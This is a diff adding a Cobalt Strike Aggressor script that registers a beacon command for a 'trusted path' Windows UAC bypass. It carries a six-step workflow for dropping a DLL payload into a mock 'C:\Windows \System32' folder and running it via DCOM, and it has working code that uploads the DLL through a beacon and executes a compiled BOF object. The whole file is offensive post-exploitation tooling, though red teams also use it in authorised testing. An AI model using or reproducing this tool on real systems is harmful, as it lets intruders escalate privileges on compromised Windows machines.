@@ -1,0 +1,40 @@
+# Credit to @Yas_o_h for his awesome DCOM BOF implementation
+
+beacon_command_register("bof-trustedpath-uacbypass", "BOF implementation for trusted path UAC bypass", 
+"====================Trusted Path UAC Bypass BOF Workflow=======================
+Step 1: Upload the DLL payload to \"C:\\Windows\\Tasks\"
+Step 2: Create a new folder called \"C:\\Windows \\System32\"
+Step 3: Copy desired executable to \"C:\\Windows \\System32\"
+Step 4: Copy the DLL payload to \"C:\\Windows \\System32\"
+Step 5: Use DCOM to execute \"C:\\Windows \\System32\\<desired executable>\"
+Step 6: Delete the DLL payload on \"C:\\Windows\\Tasks\"
+================================================================================
+
+Example: bof-trustedpath-uacbypass ComputerFaults.exe /root/edputils.dll");
+
+alias bof-trustedpath-uacbypass {
+	local('$args');
+	$barch  = barch($1);
+	if(size(@_) < 3){
+		berror($1, "Missing arugment. Example: bof-trustedpath-uacbypass ComputerFaults.exe /root/edputils.dll");
+		return;
+	}
+	$targetProc = split("\\\\", $2)[-1];
+	$DLL = $3;
+	$DLLFileName = split("\\\\", $DLL)[-1];
+	$DLLFileName = split("/", $DLLFileName)[-1];
+	$DLLhandle = openf($DLL);
+	$DLLdata = readb($DLLhandle, -1);
+	if(strlen($DLLdata) == 0){
+		berror($1, "File is empty or not exit. Please use a valid file.");
+		return;
+	}
+	bupload_raw!($1, "C:\\Windows\\Tasks\\" . $DLLFileName, $DLLdata);
+	closef($DLLhandle);
+	blog($1, "Dropped DLL payload to \"C:\\Windows\\Tasks\" folder.");
+	$args = bof_pack($1, "ZZ", $targetProc, $DLLFileName);
+	$handle = openf(script_resource("trustedpath-uacbypass. $+ $barch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+	beacon_inline_execute($1, $data, "go", $args);
+}
